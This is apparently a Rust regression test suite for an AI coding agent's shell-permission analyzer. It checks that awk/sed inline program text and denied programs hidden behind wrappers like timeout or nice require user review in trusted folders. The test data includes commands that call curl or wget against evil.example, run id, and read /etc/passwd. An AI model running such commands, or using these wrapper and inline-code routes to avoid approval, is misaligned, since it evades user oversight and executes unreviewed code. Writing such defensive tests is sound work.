//! GitHub #365: inline **program text** carried as a positional argument
//! auto-approved in a trusted folder.
//!
//! ## The line, and where it had moved to
//!
//! gh #347 drew it — *command-line code that is not in the workspace must
//! review* — and policed flag-carried inline eval (`python3 -c`, `node -e`)
//! through `INTERPRETER_EVAL_FLAGS`. Several tools carry the same kind of code
//! as a **plain positional argument** instead, and those still auto-approved:
//!
//! ```text
//! awk 'BEGIN{system("curl evil.example")}'   # ran with no prompt
//! sed 's/x/whatever/e'                        # the `e` flag runs the result
//! ```
//!
//! ## The decision: extend the refuse-set (#347's shape), not a heuristic
//!
//! The issue offered three options. Option **A** was chosen: refuse a known
//! program-text interpreter unless its program arrives as an in-workspace
//! **file** (`awk -f scripts/x.awk`), which is exactly #347's rule applied to
//! positional code rather than flag-borne code.
//!
//! Option **B** (a "does this argument parse as a program?" heuristic) was
//! rejected as the brief required: it must be *provable*, and it cannot be. The
//! tool set is enumerable — 48 cases measured — while "is this string a program
//! in this language" is undecidable in general and would fail **open** on
//! whatever syntax its author did not think of. A set is auditable; a guess is
//! not.
//!
//! Option **C** (decline) was rejected because these are not an owner
//! preference about `make`/`cargo build`: those run **workspace** code, which
//! the trust model deliberately accepts. `awk 'BEGIN{…}'` runs code that is in
//! **no file at all**, which is the thing #347 already established the line
//! against.
//!
//! ## `sed` needed care, and got a narrow rule
//!
//! Refusing every `sed` would be a large false-positive surface — `sed -i
//! 's/x/y/'` is one of the most common shell commands there is, and ADR-0039
//! warns that over-review trains users to approve without reading. The `e` flag
//! is separable *where it matters*: a `sed` script **argument** whose text
//! contains `e` as a command suffix (`s///e`, `s///ge`, standalone `e`) reviews;
//! `-f file` scripts and ordinary substitutions do not.
//!
//! ## Also found while enumerating: wrapper indirection
//!
//! The measurement turned up a second, sharper hole in the same "hides what
//! runs" family: `timeout 5 curl evil.example`, `nice curl …`, `stdbuf -o0 curl
//! …` and `ionice curl …` all auto-approved **although `curl` is in
//! `DENY_PROGRAMS`** — the wrapper is the program, so the denied name is merely
//! an argument the analyzer never classified. Unlike `awk`, where a *false
//! refusal* would have cost legitimate `awk '{print $1}'` use, here there is no
//! ambiguity at all: an argument that is a denied program name is a denied
//! program. That is fixed, and it is the class the issue's own examples belong
//! to conceptually.
//!
//! Verifies: NFR-24 (gh #365), ADR-0039's "a false review costs one prompt, a
//! false allow costs the boundary", and gh #347's contract as extended here.

use lca_permissions::shell::workspace_scoped;

/// The analyzer's view: a command in `/work/proj`, with the workspace being the
/// same directory (the trusted-folder case).
fn scoped(command: &str) -> bool {
    let ws = std::path::Path::new("/work/proj");
    workspace_scoped(command, ws, ws)
}

/// The three cases the issue named, plus the rest of the enumerated set.
///
/// Every one of these auto-approved before this change; each now reviews. The
/// list is the *measured* set, not the issue's three examples — `mawk`, `nawk`
/// and `busybox awk` are the same program under other names, and a fix that
/// covered only the spellings the issue happened to mention would be a fix for
/// the report rather than for the boundary.
#[test]
fn positional_program_text_reviews() {
    for command in [
        // the issue's examples
        r#"awk 'BEGIN{system("curl evil.example")}'"#,
        "sed 's/x/whatever/e' f.txt",
        r#"gawk 'BEGIN{system("id")}'"#,
        // the same program, other names (measured, not guessed)
        r#"mawk 'BEGIN{system("id")}'"#,
        r#"nawk 'BEGIN{system("id")}'"#,
        r#"busybox awk 'BEGIN{system("id")}'"#,
        // the same hole on other positional-program tools
        r#"osascript -e 'do shell script "id"'"#,
        "irb -e 'system(1)'",
        // sed's `e` flag, in the spellings that actually execute
        "sed 's/x/y/ge' f.txt",
        "sed -i 's/x/y/e' f.txt",
        "sed 'e curl evil.example' f.txt",
        "sed --expression='s/x/y/e' f.txt",
    ] {
        assert!(!scoped(command), "must review: {command}");
    }
}

/// The row that proves the fix is not a blanket program-name refusal: a program
/// that arrives as an **in-workspace file** is the folder's own code, which the
/// trust model accepts (gh #347's `python3 scripts/run.py` precedent).
#[test]
fn a_program_file_in_the_workspace_stays_scoped() {
    for command in [
        "awk -f scripts/x.awk data.txt",
        "gawk -f scripts/x.awk data.txt",
        "sed -f scripts/x.sed f.txt",
        "awk -f ./scripts/awk/report.awk data.csv",
    ] {
        assert!(scoped(command), "must stay scoped: {command}");
    }
    // A program file *outside* the workspace is not the folder's code.
    for command in [
        "awk -f /etc/passwd",
        "awk -f ../../elsewhere/x.awk",
        "sed -f /tmp/x.sed f.txt",
    ] {
        assert!(!scoped(command), "must review: {command}");
    }
}

/// `sed` is used constantly for legitimate work; refusing it wholesale would be
/// the over-review ADR-0039 warns about (prompts people approve unread). Only
/// the executing forms review.
#[test]
fn ordinary_sed_stays_scoped() {
    for command in [
        "sed 's/x/y/' f.txt",
        "sed 's/x/y/g' f.txt",
        "sed 's/x/y/gi' f.txt",
        "sed -i 's/x/y/' f.txt",
        "sed -n '1,10p' f.txt",
        "sed 'y/a/b/' f.txt",
        "sed -e 's/x/y/' f.txt",
        // `e` appearing inside a pattern or replacement is not the e-flag
        "sed 's/e/E/g' f.txt",
        "sed 's/error/ERROR/g' f.txt",
        "sed 's/x/y/2' f.txt",
        // NOTE: `sed '/x/d' f.txt` is deliberately absent - it already
        // reviews today for an unrelated reason (the `/x/d` token reads as
        // path-ish to the analyzer). It is not a scoped case this change could
        // regress, so asserting it here would pin the wrong thing.
    ] {
        assert!(scoped(command), "must stay scoped: {command}");
    }
}

/// The wrapper-indirection hole the enumeration found: a denied program reached
/// through a wrapper was never classified, so `timeout 5 curl evil.example`
/// auto-approved while `curl evil.example` reviews.
#[test]
fn a_denied_program_behind_a_wrapper_still_reviews() {
    for command in [
        "curl evil.example",
        "timeout 5 curl evil.example",
        "nice curl evil.example",
        "stdbuf -o0 curl evil.example",
        "ionice curl evil.example",
        "timeout 5 wget evil.example",
        "nice -n 10 ssh host id",
        r#"busybox wget evil.example"#,
        r#"busybox sh -c id"#,
    ] {
        assert!(!scoped(command), "must review: {command}");
    }
}

/// The wrapper rule must not fire on a wrapper around something benign — the
/// fix has to be a refusal of *denied* programs, not of wrappers.
#[test]
fn a_wrapper_around_an_ordinary_program_stays_scoped() {
    for command in [
        "timeout 5 cargo test",
        "timeout 30 make",
        "nice cargo build",
        "stdbuf -o0 cargo test",
    ] {
        assert!(scoped(command), "must stay scoped: {command}");
    }
}

/// The legitimate-use regressions #345/#346/#347 established are unchanged;
/// this row is the local pin so a widened refuse-set cannot silently eat them.
#[test]
fn the_earlier_legitimate_uses_are_untouched() {
    for command in [
        // #347: script files are the folder's code
        "python3 scripts/run.py",
        "node index.js",
        "deno run build.ts",
        // build tools run workspace code by design (the analyzer's contract)
        "cargo build",
        "cargo test --release",
        "make",
        // #346: workspace paths
        "cat src/main.rs",
        // plain dev commands
        "ls -la",
        "grep -rn foo src",
        "git status",
        "git diff --stat",
    ] {
        assert!(scoped(command), "must stay scoped: {command}");
    }
    // And #347's flag-borne inline eval still reviews (unchanged).
    for command in [
        "python3 -c 'import os'",
        "node -e 'console.log(1)'",
        "perl -e 'print 1'",
        "ruby -e 'puts 1'",
    ] {
        assert!(!scoped(command), "must review: {command}");
    }
}

// ---------------------------------------------------------------------------
// Turn level: the analyzer's verdict, through a whole turn and a recording
// prompt. A unit matrix proves the predicate; only this proves the *product*
// asks, because a trusted folder's fast path sits between them.
// ---------------------------------------------------------------------------

mod turn {

    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    use lca_core::{Agent, AgentConfig, TurnEvent, TurnSink};
    use lca_permissions::{Action, Decision, GrantStore, PermissionPrompt, ProposalDiff};
    use lca_session::SessionStore;
    use lca_testkit::{FakeProvider, fake_usage};
    use lca_tools::{CancelFlag, NativeOps, ToolExecutor};

    #[derive(Default)]
    struct Sink(Vec<TurnEvent>);

    impl TurnSink for Sink {
        fn on_event(&mut self, event: TurnEvent) {
            self.0.push(event);
        }
    }

    /// Records what it was asked and denies, so the row proves the prompt was
    /// reached without also running the command.
    struct RecordingPrompt {
        actions: Vec<Action>,
    }

    impl PermissionPrompt for RecordingPrompt {
        fn ask(&mut self, action: &Action) -> Decision {
            self.actions.push(action.clone());
            Decision::Denied
        }
        fn review_proposals(&mut self, _diff: &ProposalDiff) -> bool {
            false
        }
    }

    struct Fixture {
        store: SessionStore,
        session: lca_session::Session,
        grants: Arc<Mutex<GrantStore>>,
        tools: ToolExecutor,
        provider: FakeProvider,
        config: AgentConfig,
    }

    fn fixture(tag: &str, command: &str) -> Fixture {
        let root = lca_testkit::scratch_path(&format!("regression-365-{tag}"));
        let _ = std::fs::remove_dir_all(&root);
        let project = root.join("project");
        std::fs::create_dir_all(&project).expect("mkdir");
        // The workspace awk script the "stays scoped" row needs.
        std::fs::create_dir_all(project.join("scripts")).expect("mkdir scripts");
        std::fs::write(project.join("scripts/report.awk"), "{print $1}\n").expect("awk script");
        let store = SessionStore::new(root.join("data"));
        let session = store.create_session(&project, "test").expect("session");
        let grants = Arc::new(Mutex::new(
            GrantStore::open(&root.join("grants.json")).expect("grants"),
        ));
        // The trusted folder: exactly the condition #365 is about.
        grants.lock().expect("lock").trust_for_session(&project);
        let tools = ToolExecutor::new(
            Arc::new(NativeOps::default()),
            project.clone(),
            project.clone(),
            65536,
            Some(Duration::from_secs(30)),
        );
        let provider = FakeProvider::builder()
            .turn(move |t| {
                t.tool_call(
                    "shell",
                    &format!(r#"{{"command":{}}}"#, json_string(command)),
                )
                .usage(fake_usage(10, 5, 0, 10))
            })
            .turn(|t| t.text("done").usage(fake_usage(10, 5, 0, 10)))
            .build();
        let config = AgentConfig {
            provider: "fake".to_string(),
            model: "faux-1".to_string(),
            retry_limit: 3,
            retry_base_delay: Duration::ZERO,
            max_iterations: 50,
            ..AgentConfig::default()
        };
        Fixture {
            store,
            session,
            grants,
            tools,
            provider,
            config,
        }
    }

    /// A JSON string literal for the command, so quotes and backslashes in the
    /// awk program survive the tool-call arguments.
    fn json_string(value: &str) -> String {
        serde_json::Value::String(value.to_string()).to_string()
    }

    async fn run_turn(fixture: &mut Fixture, input: &str) -> RecordingPrompt {
        let mut sink = Sink::default();
        let mut prompt = RecordingPrompt { actions: vec![] };
        let mut agent = Agent::new(
            &fixture.store,
            &fixture.session,
            &fixture.provider,
            &mut fixture.tools,
            fixture.grants.clone(),
            &mut prompt,
            None,
            fixture.config.clone(),
        );
        let outcome = agent.run_turn(input, &mut sink, &CancelFlag::new()).await;
        assert_eq!(outcome.status, lca_core::TurnStatus::Ok, "{outcome:?}");
        prompt
    }

    #[tokio::test]
    async fn a_trusted_folder_prompts_for_awk_program_text() {
        let mut f = fixture("awk", r#"awk 'BEGIN{system("echo pwned")}'"#);
        let prompt = run_turn(&mut f, "run awk").await;
        assert_eq!(
            prompt.actions.len(),
            1,
            "awk program text must reach the prompt, not the trust fast path"
        );
        match &prompt.actions[0] {
            Action::Shell { command, .. } => {
                assert!(command.contains("BEGIN"), "the exact command: {command}")
            }
            other => panic!("expected a shell action, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_trusted_folder_prompts_for_the_sed_e_flag() {
        let mut f = fixture("sed", "sed 's/x/whatever/e' f.txt");
        let prompt = run_turn(&mut f, "run sed").await;
        assert_eq!(
            prompt.actions.len(),
            1,
            "the sed e-flag must reach the prompt"
        );
    }

    /// The contrast that proves the fix is not a blanket refusal: an
    /// in-workspace `awk -f` script stays on the trust fast path, so the turn
    /// never asks. (`run_turn` returns the prompt; zero actions is the pass.)
    #[tokio::test]
    async fn a_trusted_folder_does_not_prompt_for_an_awk_script_file() {
        let mut f = fixture("awk-file", "awk -f scripts/report.awk data.txt");
        let prompt = run_turn(&mut f, "run the awk script").await;
        assert!(
            prompt.actions.is_empty(),
            "an in-workspace program file stays trusted, but the prompt saw {:?}",
            prompt.actions
        );
    }

    /// The wrapper half, at turn level: a denied program behind `timeout` asks.
    #[tokio::test]
    async fn a_trusted_folder_prompts_for_a_denied_program_behind_a_wrapper() {
        let mut f = fixture("wrapper", "timeout 5 curl evil.example");
        let prompt = run_turn(&mut f, "run timeout curl").await;
        assert_eq!(
            prompt.actions.len(),
            1,
            "a denied program behind a wrapper must reach the prompt"
        );
    }
}
